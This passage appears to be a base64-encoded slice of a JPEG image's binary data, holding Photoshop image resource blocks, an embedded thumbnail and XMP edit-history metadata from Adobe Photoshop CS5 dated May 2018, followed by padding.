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AKAAxADkAOQA4ACkAAAAAAABJbnRlZW51bQAAAABJbnRlAAAAAENscm0AAAAATXBCbGJvb2wBAAAAD3ByaW50U2l4dGVlbkJpdGJvb2wAAAAAC3ByaW50ZXJOYW1lVEVYVAAAABIAXABcAHAAcwBwAHIAcwBcAE0ARgBQAF8AQgBuAHAAcABmAAAAOEJJTQQ7AAAAAAGyAAAAEAAAAAEAAAAAABJwcmludE91dHB1dE9wdGlvbnMAAAASAAAAAENwdG5ib29sAAAAAABDbGJyYm9vbAAAAAAAUmdzTWJvb2wAAAAAAENybkNib29sAAAAAABDbnRDYm9vbAAAAAAATGJsc2Jvb2wAAAAAAE5ndHZib29sAAAAAABFbWxEYm9vbAAAAAAASW50cmJvb2wAAAAAAEJja2dPYmpjAAAAAQAAAAAAAFJHQkMAAAADAAAAAFJkICBkb3ViQG/gAAAAAAAAAAAAR3JuIGRvdWJAb+AAAAAAAAAAAABCbCAgZG91YkBv4AAAAAAAAAAAAEJyZFRVbnRGI1JsdAAAAAAAAAAAAAAAAEJsZCBVbnRGI1JsdAAAAAAAAAAAAAAAAFJzbHRVbnRGI1B4bEBSAAAAAAAAAAAACnZlY3RvckRhdGFib29sAQAAAABQZ1BzZW51bQAAAABQZ1BzAAAAAFBnUEMAAAAATGVmdFVudEYjUmx0AAAAAAAAAAAAAAAAVG9wIFVudEYjUmx0AAAAAAAAAAAAAAAAU2NsIFVudEYjUHJjQFkAAAAAAAA4QklNA+0AAAAAABAASAAAAAEAAgBIAAAAAQACOEJJTQQmAAAAAAAOAAAAAAAAAAAAAD+AAAA4QklNBA0AAAAAAAQAAAB4OEJJTQQZAAAAAAAEAAAAHjhCSU0D8wAAAAAACQAAAAAAAAAAAQA4QklNJxAAAAAAAAoAAQAAAAAAAAACOEJJTQP1AAAAAABIAC9mZgABAGxmZgAGAAAAAAABAC9mZgABAKGZmgAGAAAAAAABADIAAAABAFoAAAAGAAAAAAABADUAAAABAC0AAAAGAAAAAAABOEJJTQP4AAAAAABwAAD/////////////////////////////A+gAAAAA/////////////////////////////wPoAAAAAP////////////////////////////8D6AAAAAD////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AAAAAVQAAAAEBAAAADwBBAGQAbwBiAGUAIABQAGgAbwB0AG8AcwBoAG8AcAAAABMAQQBkAG8AYgBlACAAUABoAG8AdABvAHMAaABvAHAAIABDAFMANQAAAAEAOEJJTQQGAAAAAAAHAAgAAAABAQD/4RmZaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/PiA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA1LjAtYzA2MCA2MS4xMzQ3NzcsIDIwMTAvMDIvMTItMTc6MzI6MDAgICAgICAgICI+IDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+IDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtbG5zOnBob3Rvc2hvcD0iaHR0cDovL25zLmFkb2JlLmNvbS9waG90b3Nob3AvMS4wLyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcDpDcmVhdGVEYXRlPSIyMDE4LTA1LTA0VDE1OjAxOjI2KzAyOjAwIiB4bXA6TWV0YWRhdGFEYXRlPSIyMDE4LTA1LTA3VDE1OjAwOjQ0KzAyOjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAxOC0wNS0wN1QxNTowMDo0NCswMjowMCIgZGM6Zm9ybWF0PSJpbWFnZS9qcGVnIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjYyRTA2NDhDRjY1MUU4MTE4RjI1OTRGMzFFOTgxQUU4IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjY5QzJDNzQwOUI0RkU4MTE5NDhCODhDRTJBQzBFRDA2IiB4bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ9InhtcC5kaWQ6NjlDMkM3NDA5QjRGRTgxMTk0OEI4OENFMkFDMEVEMDYiIHBob3Rvc2hvcDpDb2xvck1vZGU9IjMiIHBob3Rvc2hvcDpJQ0NQcm9maWxlPSJzUkdCIElFQzYxOTY2LTIuMSI+IDx4bXBNTTpIaXN0b3J5PiA8cmRmOlNlcT4gPHJkZjpsaSBzdEV2dDphY3Rpb249ImNyZWF0ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6NjlDMkM3NDA5QjRGRTgxMTk0OEI4OENFMkFDMEVEMDYiIHN0RXZ0OndoZW49IjIwMTgtMDUtMDRUMTU6MDE6MjYrMDI6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDUzUgV2luZG93cyIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6NkFDMkM3NDA5QjRGRTgxMTk0OEI4OENFMkFDMEVEMDYiIHN0RXZ0OndoZW49IjIwMTgtMDUtMDRUMTU6MDM6MTArMDI6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDUzUgV2luZG93cyIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6NkJDMkM3NDA5QjRGRTgxMTk0OEI4OENFMkFDMEVEMDYiIHN0RXZ0OndoZW49IjIwMTgtMDUtMDRUMTU6MDM6MTkrMDI6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDUzUgV2luZG93cyIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6NkNDMkM3NDA5QjRGRTgxMTk0OEI4OENFMkFDMEVEMDYiIHN0RXZ0OndoZW49IjIwMTgtMDUtMDRUMTU6MDcrMDI6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDUzUgV2luZG93cyIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6MTc0RjZBNUVCMjRGRTgxMTk0OEI4OENFMkFDMEVEMDYiIHN0RXZ0OndoZW49IjIwMTgtMDUtMDRUMTg6MDc6MDQrMDI6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDUzUgV2luZG93cyIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6RUY1ODUwMUZENDUxRTgxMThGMjU5NEYzMUU5ODFBRTgiIHN0RXZ0OndoZW49IjIwMTgtMDUtMDdUMTA6NTM6MzMrMDI6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDUzUgV2luZG93cyIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6RjY1ODUwMUZENDUxRTgxMThGMjU5NEYzMUU5ODFBRTgiIHN0RXZ0OndoZW49IjIwMTgtMDUtMDdUMTQ6MTc6NTIrMDI6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDUzUgV2luZG93cyIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6OTQ2MDREQkFGMzUxRTgxMThGMjU5NEYzMUU5ODFBRTgiIHN0RXZ0OndoZW49IjIwMTgtMDUtMDdUMTQ6NTc6MTErMDI6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDUzUgV2luZG93cyIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6OTU2MDREQkFGMzUxRTgxMThGMjU5NEYzMUU5ODFBRTgiIHN0RXZ0OndoZW49IjIwMTgtMDUtMDdUMTQ6NTc6MTErMDI6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDUzUgV2luZG93cyIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6OTY2MDREQkFGMzUxRTgxMThGMjU5NEYzMUU5ODFBRTgiIHN0RXZ0OndoZW49IjIwMTgtMDUtMDdUMTQ6NTg6NDIrMDI6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDUzUgV2luZG93cyIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6NUVFMDY0OENGNjUxRTgxMThGMjU5NEYzMUU5ODFBRTgiIHN0RXZ0OndoZW49IjIwMTgtMDUtMDdUMTQ6NTk6NTkrMDI6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDUzUgV2luZG93cyIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0ic2F2ZWQiIHN0RXZ0Omluc3RhbmNlSUQ9InhtcC5paWQ6NjFFMDY0OENGNjUxRTgxMThGMjU5NEYzMUU5ODFBRTgiIHN0RXZ0OndoZW49IjIwMTgtMDUtMDdUMTU6MDA6NDQrMDI6MDAiIHN0RXZ0OnNvZnR3YXJlQWdlbnQ9IkFkb2JlIFBob3Rvc2hvcCBDUzUgV2luZG93cyIgc3RFdnQ6Y2hhbmdlZD0iLyIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0iY29udmVydGVkIiBzdEV2dDpwYXJhbWV0ZXJzPSJmcm9tIGFwcGxpY2F0aW9uL3ZuZC5hZG9iZS5waG90b3Nob3AgdG8gaW1hZ2UvanBlZyIvPiA8cmRmOmxpIHN0RXZ0OmFjdGlvbj0iZGVyaXZlZCIgc3RFdnQ6cGFyYW1ldGVycz0iY29udmVydGVkIGZyb20gYXBwbGljYXRpb24vdm5kLmFkb2JlLnBob3Rvc2hvcCB0byBpbWFnZS9qcGVnIi8+IDxyZGY6bGkgc3RFdnQ6YWN0aW9uPSJzYXZlZCIgc3RFdnQ6aW5zdGFuY2VJRD0ieG1wLmlpZDo2MkUwNjQ4Q0Y2NTFFODExOEYyNTk0RjMxRTk4MUFFOCIgc3RFdnQ6d2hlbj0iMjAxOC0wNS0wN1QxNTowMDo0NCswMjowMCIgc3RFdnQ6c29mdHdhcmVBZ2VudD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiBzdEV2dDpjaGFuZ2VkPSIvIi8+IDwvcmRmOlNlcT4gPC94bXBNTTpIaXN0b3J5PiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo2MUUwNjQ4Q0Y2NTFFODExOEYyNTk0RjMxRTk4MUFFOCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo2OUMyQzc0MDlCNEZFODExOTQ4Qjg4Q0UyQUMwRUQwNiIgc3RSZWY6b3JpZ2luYWxEb2N1bWVudElEPSJ4bXAuZGlkOjY5QzJDNzQwOUI0RkU4MTE5NDhCODhDRTJBQzBFRDA2Ii8+IDxwaG90b3Nob3A6RG9jdW1lbnRBbmNlc3RvcnM+IDxyZGY6QmFnPiA8cmRmOmxpPmFkb2JlOmRvY2lkOnBob3Rvc2hvcDo0MzBmMmZlYi1mNDI2LTExNzctYjRlMy05OTdiZmMxNjdlOWI8L3JkZjpsaT4gPHJkZjpsaT5hZG9iZTpkb2NpZDpwaG90b3Nob3A6NTM3ZGRkOTctYjU1MC0xMTc3LWI5M2UtZmU0NDZkMzgxZWQ4PC9yZGY6bGk+IDxyZGY6bGk+eG1wLmRpZDo2OUMyQzc0MDlCNEZFODExOTQ4Qjg4Q0UyQUMwRUQwNjwvcmRmOmxpPiA8cmRmOmxpPnhtcC5kaWQ6ZDVjZGUxZDItNzVhNi1hMjRmLWFlNzItZTYxZjA4OWYxNmFlPC9yZGY6bGk+IDwvcmRmOkJhZz4gPC9waG90b3Nob3A6RG9jdW1lbnRBbmNlc3RvcnM+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA